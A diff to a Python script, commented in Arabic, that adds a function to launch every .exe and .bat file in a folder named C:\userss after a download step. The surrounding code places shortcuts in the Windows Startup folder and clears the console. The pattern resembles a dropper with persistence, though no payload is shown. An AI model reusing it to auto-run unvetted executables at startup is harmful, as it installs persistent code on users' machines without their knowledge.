@@ -54,6 +54,21 @@ def create_shortcuts(programs_folder, startup_folder):
         shortcut.WorkingDirectory = programs_folder
         shortcut.save()
 
+def run_programs(programs_folder):
+    """
+    تشغيل جميع الملفات ذات الامتدادات .exe و .bat في مجلد البرامج.
+    """
+    supported_extensions = ['.exe', '.bat']
+    for program in os.listdir(programs_folder):
+        program_path = os.path.join(programs_folder, program)
+        if os.path.isfile(program_path):  # التأكد من أن العنصر هو ملف
+            if Path(program).suffix.lower() in supported_extensions:  # التحقق من الامتداد
+                try:
+                    print(f"Running: {program_path}")
+                    subprocess.Popen([program_path], shell=True)  # تشغيل البرنامج
+                except Exception as e:
+                    print(f"Failed to run {program_path}: {e}")
+
 programs_folder = r"C:\userss"
 startup_folder = os.path.join(os.getenv('APPDATA'), r"Microsoft\Windows\Start Menu\Programs\Startup")
 
@@ -76,3 +91,6 @@ if __name__ == "__main__":
     create_shortcuts(programs_folder, startup_folder)
 
     os.system('cls')
+
+    # تشغيل البرامج بعد التنزيل
+    run_programs(programs_folder)
